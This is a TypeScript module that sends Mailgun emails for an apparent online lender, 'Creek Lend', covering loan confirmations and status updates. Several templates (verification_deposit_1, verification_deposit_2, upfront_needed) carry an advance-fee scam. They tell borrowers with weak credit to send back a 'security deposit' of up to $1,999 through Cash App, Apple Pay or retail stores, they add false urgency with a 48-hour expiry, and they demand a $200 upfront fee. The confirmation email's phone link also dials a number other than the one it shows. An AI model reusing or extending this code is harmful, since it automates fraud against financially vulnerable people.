interface ApplicationDetails {
  applicationId: string;
  firstName: string;
  lastName: string;
  email: string;
  loanAmount: number;
  loanPurpose: string;
  loanTerm: number;
}

export async function sendMailgunEmail(
  to: string,
  subject: string,
  html: string,
): Promise<void> {
  const apiKey = process.env.MAILGUN_API_KEY;
  const domain = process.env.MAILGUN_DOMAIN;
  const from = process.env.MAILGUN_FROM || `mailgun@${domain}`;
  const baseUrl = process.env.MAILGUN_API_URL || "https://api.mailgun.net";

  if (!apiKey || !domain) {
    throw new Error("Mailgun API key or domain not configured");
  }

  const form = new URLSearchParams();
  form.append("from", from);
  form.append("to", to);
  form.append("subject", subject);
  form.append("html", html);

  const response = await fetch(`${baseUrl}/v3/${domain}/messages`, {
    method: "POST",
    headers: {
      Authorization: `Basic ${Buffer.from(`api:${apiKey}`).toString("base64")}`,
    },
    body: form,
  });

  if (!response.ok) {
    const errorBody = await response.text();
    throw new Error(`Mailgun API error (${response.status}): ${errorBody}`);
  }
}

export async function sendApplicationConfirmationEmail(
  details: ApplicationDetails,
): Promise<void> {
  const {
    applicationId,
    firstName,
    lastName,
    email,
    loanAmount,
    loanPurpose,
    loanTerm,
  } = details;

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
  }).format(loanAmount);

  const purposeLabel = loanPurpose
    .replace(/-/g, " ")
    .replace(/\b\w/g, (c) => c.toUpperCase());

  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
      <div style="background: #F0FFF4; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
        <img src="https://www.creeklend.com/logo-dark.png" alt="Creek Lend" style="height: 48px; width: 200px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
      </div>
      <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
        <h2 style="color: #111827; margin-top: 0;">Application Received!</h2>
        <p style="color: #374151; font-size: 16px;">
          Hi ${firstName},
        </p>
        <p style="color: #374151; font-size: 16px;">
          Thank you for submitting your loan application. We have received your application and it is now being processed.
        </p>
        <div style="background: #f3f4f6; border-radius: 8px; padding: 20px; margin: 20px 0;">
          <h3 style="color: #111827; margin-top: 0;">Application Details</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Application ID</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; font-weight: bold; text-align: right;">${applicationId}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Applicant Name</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; text-align: right;">${firstName} ${lastName}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Loan Amount</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; font-weight: bold; text-align: right;">${formattedAmount}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Loan Purpose</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; text-align: right;">${purposeLabel}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Loan Term</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; text-align: right;">${loanTerm} months</td>
            </tr>
          </table>
        </div>
        <div style="background: #fef3c7; border: 1px solid #f59e0b; border-radius: 8px; padding: 15px; margin: 20px 0;">
          <p style="color: #92400e; font-size: 14px; margin: 0;">
            <strong>Next Step:</strong> Please complete the bank verification process to proceed with your application.
          </p>
        </div>
        <p style="color: #374151; font-size: 14px;">
          Please save your Application ID <strong>${applicationId}</strong> for future reference. You can use it to check your application status at any time.
        </p>
        <div style="text-align: center; margin: 25px 0;">
          <a href="${process.env.FRONTEND_URL}/verify-bank?applicationId=${applicationId}" style="background: #1a56db; color: #ffffff; padding: 12px 30px; border-radius: 6px; text-decoration: none; font-size: 16px; font-weight: bold; display: inline-block;">Verify Bank Account</a>
        </div>
        <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 20px 0;">
        <div style="text-align: center; padding: 10px 0;">
          <p style="color: #374151; font-size: 14px; margin: 5px 0;">
            <strong>Phone:</strong> <a href="tel:+17472005228" style="color: #1a56db; text-decoration: none;">(747) 206-1606</a>
          </p>
          <p style="color: #374151; font-size: 14px; margin: 5px 0;">
            <strong>Website:</strong> <a href="https://www.creeklend.com" style="color: #1a56db; text-decoration: none;">www.creeklend.com</a>
          </p>
        </div>
        <p style="color: #9ca3af; font-size: 12px; text-align: center;">
          This is an automated email from Creek Lend. Please do not reply to this email.
        </p>
      </div>
    </div>
  `;

  await sendMailgunEmail(
    email,
    `Application Received - ID: ${applicationId} | Creek Lend`,
    html,
  );
}

interface StatusUpdateDetails {
  applicationId: string;
  firstName: string;
  email: string;
  loanAmount: number;
  status: string;
}

const statusConfig: Record<
  string,
  {
    title: string;
    message: string;
    color: string;
    icon: string;
    subject?: string;
    customBody?: (
      details: StatusUpdateDetails,
      formattedAmount: string,
    ) => string;
  }
> = {
  bank_verification_pending: {
    title: "Bank Verification Required",
    message:
      "Your loan application has been received. Please complete the bank verification process to proceed with your application.",
    color: "#f59e0b",
    icon: "&#127974;",
  },
  bank_verification_in_progress: {
    title: "Bank Verification In Progress",
    message:
      "Your bank verification is currently being processed. Please allow some time for us to verify your bank account details. We will notify you once the verification is complete.",
    color: "#2563eb",
    icon: "&#9203;",
  },
  deposit_in_progress: {
    title: "Verification Deposit In Process",
    message:
      "A micro-deposit has been initiated to your bank account. Please check your bank statement in 1-2 business days for the deposit amounts and come back to verify them.",
    color: "#f59e0b",
    icon: "&#128176;",
  },
  bank_verification_completed: {
    title: "Bank Verification Completed",
    message:
      "Your bank verification has been successfully completed. Your application is now being prepared for review by our team.",
    color: "#16a34a",
    icon: "&#9989;",
  },
  bank_verification_failed: {
    title: "Bank Verification Failed",
    message:
      "Unfortunately, we were unable to verify your bank account. Please re-submit your bank verification with correct credentials to continue with your loan application.",
    color: "#dc2626",
    icon: "&#9888;",
  },
  reviewing: {
    title: "Application Under Review",
    message:
      "Your loan application is currently being reviewed by our team. We will notify you once a decision has been made.",
    color: "#2563eb",
    icon: "&#128269;",
  },
  approved: {
    title: "Application Approved!",
    message:
      "Congratulations! Your loan application has been approved. Our team will be in touch shortly with the next steps to finalize your loan.",
    color: "#16a34a",
    icon: "&#9989;",
  },
  declined: {
    title: "Application Update",
    message:
      "After careful review, we are unable to approve your loan application at this time. If you have any questions, please don't hesitate to contact our support team.",
    color: "#dc2626",
    icon: "&#10060;",
  },
  funded: {
    title: "Loan Funded!",
    subject: "Approved: Your Creek Lend loan is funded!",
    message: "",
    customBody: (details) => `
      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
      <p style="color: #374151; font-size: 16px;">Great news! Your loan application has been fully approved and finalized.</p>
      <p style="color: #374151; font-size: 16px;">The funds are on their way and will be deposited into your registered bank account within the next 24 hours. (Exact availability depends on your bank's standard processing times.)</p>
      <p style="color: #374151; font-size: 16px;">Your official loan agreement and repayment schedule are now available in your secure online portal.</p>
      <p style="color: #374151; font-size: 16px;">If you do not see the funds in your account after 24 hours, please call your dedicated Loan Officer immediately.</p>
      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Funding Team<br/>Direct Support: (747) 206-1606</p>
    `,
    color: "#16a34a",
    icon: "&#9989;",
  },
  pending: {
    title: "Application Pending",
    message:
      "Your application is now pending review. Our team will begin reviewing your application shortly.",
    color: "#f59e0b",
    icon: "&#9203;",
  },
  verification_deposit_1: {
    title: "Finalize Verification Deposit",
    subject: "ACTION REQUIRED: Finalize your Creek Lend verification deposit",
    message: "",
    customBody: (details) => `
      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
      <p style="color: #374151; font-size: 16px;">Thank you for choosing Creek Lend. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
      <p style="color: #374151; font-size: 16px;">Because Creek Lend specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
      <h3 style="color: #111827; margin-top: 20px;">YOUR NEXT STEPS:</h3>
      <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Creek Lend will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
        <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer</strong><br/>As soon as these funds are fully cleared and available in your balance, please immediately call your dedicated Loan Officer to confirm the exact amount received.</li>
        <li style="margin-bottom: 10px;"><strong>Return the Security Deposit</strong><br/>To complete the verification cycle and release your full loan funding, our security policy requires you to return this exact deposit amount to us. For your convenience, this can be completed instantly via Cash App, Apple Pay, or in person at a local merchant near you (including CVS, Walgreens, and Walmart).</li>
      </ol>
      <div style="background: #fef3c7; border: 1px solid #f59e0b; border-radius: 8px; padding: 15px; margin: 20px 0;">
        <p style="color: #92400e; font-size: 14px; margin: 0;"><strong>Please Note:</strong> Your full loan disbursement is temporarily on hold until this verification deposit is safely processed and settled.</p>
      </div>
      <p style="color: #374151; font-size: 16px;">If you have any questions or need help finding a nearby payment location, our support team is standing by to assist you.</p>
      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
    `,
    color: "#2563eb",
    icon: "&#128176;",
  },
  verification_deposit_2: {
    title: "Re-verification Deposit Required",
    subject:
      "URGENT: Re-verification deposit required for your Creek Lend loan",
    message: "",
    customBody: (details) => `
      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
      <p style="color: #374151; font-size: 16px;">We are contacting you because our automated compliance system was unable to clear your initial bank account validation.</p>
      <h3 style="color: #111827; margin-top: 20px;">REASON FOR RE-VERIFICATION:</h3>
      <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Creek Lend works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
      <p style="color: #374151; font-size: 16px;">We have initiated a new, secondary verification deposit to override the previous error.</p>
      <h3 style="color: #111827; margin-top: 20px;">YOUR MANDATORY NEXT STEPS:</h3>
      <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Creek Lend has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
        <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer Immediately</strong><br/>As soon as you see this specific new amount clear in your available balance, call your dedicated Loan Officer right away to verify the exact digits. Do not use the previous deposit figures, as they are now expired and voided.</li>
        <li style="margin-bottom: 10px;"><strong>Return the Re-Verification Deposit</strong><br/>To clear the security flag on your profile and release your pending loan funding, you must return this exact new deposit amount to us. You can complete this instantly via Cash App, Apple Pay, or in person at a local retail merchant near you (including CVS, Walgreens, and Walmart).</li>
      </ol>
      <div style="background: #fee2e2; border: 1px solid #ef4444; border-radius: 8px; padding: 15px; margin: 20px 0;">
        <p style="color: #991b1b; font-size: 14px; margin: 0;"><strong>Important Notice:</strong> Your loan approval cannot be maintained indefinitely while in a flagged state. Your full loan disbursement remains heavily on hold, and failure to complete this secondary step within 48 hours will result in the automatic expiration of your application.</p>
      </div>
      <p style="color: #374151; font-size: 16px;">If you need help identifying the new deposit or locating a nearby payment node, call our specialized verification line immediately.</p>
      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
    `,
    color: "#dc2626",
    icon: "&#9888;",
  },
  upfront_needed: {
    title: "Processing Update",
    subject:
      "Action Required: Processing update for your Creek Lend application",
    message: "",
    customBody: (details, formattedAmount) => `
      <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
      <p style="color: #374151; font-size: 16px;">Thank you for submitting your application for a loan of ${formattedAmount}. Your application is currently on hold under Application ID: ${details.applicationId}.</p>
      <p style="color: #374151; font-size: 16px;">Because your primary account is with an online banking institution, our automated system cannot fully verify your financial details. To move your application forward, our underwriting team must perform a manual review. This process involves manually auditing your bank statements, pulling and analyzing your credit report, and drafting the formal approval documentation required to fund your loan.</p>
      <p style="color: #374151; font-size: 16px;">To cover the additional administrative resources required for this manual review, a one-time processing fee of $200.00 is required before we can proceed.</p>
      <p style="color: #374151; font-size: 16px;">If you would like to move forward with this processing method, please call your dedicated Loan Officer at your earliest convenience to arrange the payment and finalize your application.</p>
      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Creek Lend Verifications Team<br/>Direct Support: (747) 206-1606</p>
    `,
    color: "#f59e0b",
    icon: "&#128176;",
  },
};

export async function sendStatusUpdateEmail(
  details: StatusUpdateDetails,
): Promise<void> {
  const { applicationId, firstName, email, loanAmount, status } = details;

  const config = statusConfig[status];
  if (!config) return;

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
  }).format(loanAmount);

  const subject =
    config.subject || `${config.title} - ID: ${applicationId} | Creek Lend`;

  const messageHtml = config.customBody
    ? config.customBody(details, formattedAmount)
    : `
        <p style="color: #374151; font-size: 16px;">
          Hi ${firstName},
        </p>
        <p style="color: #374151; font-size: 16px;">
          ${config.message}
        </p>
      `;

  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
      <div style="background: #F0FFF4; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
        <img src="https://www.creeklend.com/logo-dark.png" alt="Creek Lend" style="height: 48px; width: 270px; display: block; margin: 0 auto 8px;" onerror="this.style.display='none'" />
      </div>
      <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
        <div style="text-align: center; margin-bottom: 20px;">
          <span style="font-size: 48px;">${config.icon}</span>
        </div>
        <h2 style="color: ${config.color}; margin-top: 0; text-align: center;">${config.title}</h2>
        ${messageHtml}
        <div style="background: #f3f4f6; border-radius: 8px; padding: 20px; margin: 20px 0;">
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Application ID</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; font-weight: bold; text-align: right;">${applicationId}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Loan Amount</td>
              <td style="padding: 8px 0; color: #111827; font-size: 14px; font-weight: bold; text-align: right;">${formattedAmount}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; color: #6b7280; font-size: 14px;">Status</td>
              <td style="padding: 8px 0; font-size: 14px; font-weight: bold; text-align: right;">
                <span style="background: ${config.color}; color: #ffffff; padding: 4px 12px; border-radius: 12px; font-size: 12px;">${status.replace(/_/g, " ").toUpperCase()}</span>
              </td>
            </tr>
          </table>
        </div>
        <p style="color: #374151; font-size: 14px;">
          You can check your application status at any time using your Application ID <strong>${applicationId}</strong>.
        </p>
        ${
          ["bank_verification_failed"].includes(status)
            ? `<div style="text-align: center; margin: 25px 0;">
          <a href="${process.env.FRONTEND_URL}/verify-bank?applicationId=${applicationId}" style="background: #1a56db; color: #ffffff; padding: 12px 30px; border-radius: 6px; text-decoration: none; font-size: 16px; font-weight: bold; display: inline-block;">Verify Bank Account</a>
        </div>`
            : ""
        }
        <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 20px 0;">
        <div style="text-align: center; padding: 10px 0;">
          <p style="color: #374151; font-size: 14px; margin: 5px 0;">
            <strong>Phone:</strong> <a href="tel:+17472061606" style="color: #1a56db; text-decoration: none;">(747) 206-1606</a>
          </p>
          <p style="color: #374151; font-size: 14px; margin: 5px 0;">
            <strong>Website:</strong> <a href="https://www.creeklend.com" style="color: #1a56db; text-decoration: none;">www.creeklend.com</a>
          </p>
        </div>
        <p style="color: #9ca3af; font-size: 12px; text-align: center;">
          This is an automated email from Creek Lend. Please do not reply to this email.
        </p>
      </div>
    </div>
  `;

  await sendMailgunEmail(email, subject, html);
}
